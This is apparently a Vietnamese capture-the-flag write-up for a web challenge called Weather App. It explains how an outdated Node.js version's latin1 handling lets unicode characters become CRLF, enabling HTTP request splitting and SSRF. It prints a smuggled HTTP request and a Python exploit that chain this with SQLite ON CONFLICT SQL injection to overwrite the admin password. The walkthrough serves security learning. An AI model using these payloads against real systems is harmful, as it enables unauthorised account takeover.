# Weather App

## Tóm tắt

Đây lại là một bài Whitebox, cần một chút hiểu biết(đã từng làm) về các lỗ hổng khác để có thể hoàn thành bài.

Điểm đang chú ý nhất là việc lỗi dẫn đến lỗ hổng SSRF ở bài này là việc chuyển đổi từ String tới bytes có thể dẫn tới lỗ hổng.&#x20;

## &#x20;Walkthrough


![screenshot-from-2021-09-11-01-13-58.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1642606952079/voGdZf0sj.png)

Lướt qua ứng dụng cũng không có gì ngoài việc ứng dụng đưa ra dữ liệu về thời tiết hiện tại. Phải lướt qua source để tìm kiếm thêm API.

&#x20;


![image (4).png](https://cdn.hashnode.com/res/hashnode/image/upload/v1642606970548/YS_8xT-5k.png)

Flag sẽ được đưa ra khi chúng ta login được vào tài khoản admin. Ngoài ra, còn một API cho phép ta đăng ký tài khoản mới và tại đây tồn tại lỗ hổng SQL Injection (cái này  tác giả cũng cẩn thận note lại cho mọi người).


![image (5).png](https://cdn.hashnode.com/res/hashnode/image/upload/v1642606983325/rbxRo__T3.png)

Việc xử lý tài khoản admin được tạo ban đầu có thể bypass tương tự như trong [MYSQL](https://book.hacktricks.xyz/pentesting-web/sql-injection#on-duplicate-key-update) với [SQLite on Conflict](https://sqlite.org/lang\_conflict.html). Nhưng một vấn đề ở đây là việc đăng kí chỉ có phép từ Local!


![image (6).png](https://cdn.hashnode.com/res/hashnode/image/upload/v1642606990978/jWcy7iYWz.png)

Mình lúc đầu cũng ngây thơ khi tìm cách bypass cái regex này thông qua việc sửa Header để bypass nhưng mọi nỗ lực tìm kiếm đều chỉ ra việc bypass cái regex này là không thể =)))&#x20;

Quay ra tìm thêm được một đoạn API thời tiết để lấy thông tin có thể Injection nhưng API cũng chỉ là để đổ dữ liệu ra Frontend, không thấy sử dụng phía Server side.&#x20;


![image (7).png](https://cdn.hashnode.com/res/hashnode/image/upload/v1642606999020/MsVR-mSQe.png)

Cuối cùng quay lại với file `Docker`  thì phát hiện khá hay là ứng dụng này dùng `Nodejs v8.12.0`  một phiên bản khá là cũ với phiên bản LTS hiện tại là `v14` và `v12` tức là còn trước cả `v10`. Tìm hiểu một hồi lâu thì phiên bản này tồn tại khá nhiều lỗ hổng, đặc biệt có vài lỗ hổng liên quan tới `SSRF` thông qua `Request Splitting`, và mình lang thang một hồi tìm được bài này [Security bugs: SSRF via Request Splitting ](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/).

Tóm váy nhanh thì như sau:

* `http.get()` nhận vào đối số là một `string.`
* Nhưng việc thực hiện gửi `HTTP request `thì cần sử dụng là `bytes array` chứ không thể thực hiện trên `string`.  Do đó các string khi được đưa vào sẽ đồng thời chuyển về bytes array và escape các kí tự đặc biệt.&#x20;
* Việc thực hiện này lại sử dụng việc decoding mặc định của Nodejs thông qua bộ mã hóa `latin1` nếu không có body.
* Bộ mã hóa này không thể hiện các ký tự unicode high-numbered unicode, mà chỉ biểu diễn bằng cách chỉ sử dụng phần low-numbered unicode.

```javascript
> v = "/caf\u{E9}\u{01F436}"
'/café🐶'
> Buffer.from(v, 'latin1').toString('latin1')
'/café=6'
```

* Do đó, có thể chèn các kí tự ngắt (`CRLF`) để có thể thực hiện `Request Splitting` bằng cách sử dụng các ký tự `\u010A\u010D` thì sẽ trở thành ký tự ngắt `CRLF`khi được gửi đi.&#x20;

Quay lại với cái lỗ hổng ở mã nguồn ở trên thì việc có thể thực hiện chuyển mật khẩu tài khoản admin thông qua `Request splitting` tới API lấy dữ liệu thời tiết.

Request cần gửi sẽ có dạng như sau, nhớ là giữa các request cần loại bỏ Header`Connection: close` để tránh đóng kết nối khi tất cả các request chưa được chạy hết, chỉ để lại Header này ở request cuối cùng.

```http
GET /api...<start here> HTTP/1.1
Host: 127.0.0.1

POST /register HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
username=admin&password=123') on conflict(username) do update set password='d3s34'-- -

GET /..<end here> HTTP/1.1
Host: 127.0.0.1
Connection: close
```

&#x20;Để thực hiện đoạn body ở giữ thì cần đưa ngắt dòng của HTTP Request vào thông qua lỗ hổng phía trên của NodeJs. Đoạn code exploit mình viết được sẽ như sau:

```python
def exploit():
    crlf = "\u010D\u010A"
    space = "\u0120"

    username = "admin"
    password="1') on conflict(username) do update set password='d3s34';-- -"\
        .replace(" ", space)\
        .replace("'", "%27")

    payload = f"{space}HTTP/1.1{crlf}" \
              f"Host:{space}127.0.0.1{crlf}" \
              f"{crlf}" \
                        \
              f"POST{space}/register{space}HTTP/1.1{crlf}" \
              f"Host:{space}127.0.0.1{crlf}" \
              f"Content-Type:{space}application/x-www-form-urlencoded{crlf}" \
              f"Content-Length:{space}{len(username) + len(password) + len('username=&password=')}{crlf}" \
              f"{crlf}" \
              f"username={username}&password={password}{crlf}" \
              f"{crlf}" \
                        \
              f"GET{space}/VN"

    data = {
        "endpoint": "127.0.0.1",
        "city": "Hanoi",
        "country": "VN" + payload
    }

    response = requests.post(url="http://188.166.173.208:31625/api/weather", data=data)
```

&#x20;Và kết quả sẽ đăng nhập được thông qua mật khẩu Injection được ở trên.


![image (8).png](https://cdn.hashnode.com/res/hashnode/image/upload/v1642607012983/RwhiCf-Po.png)
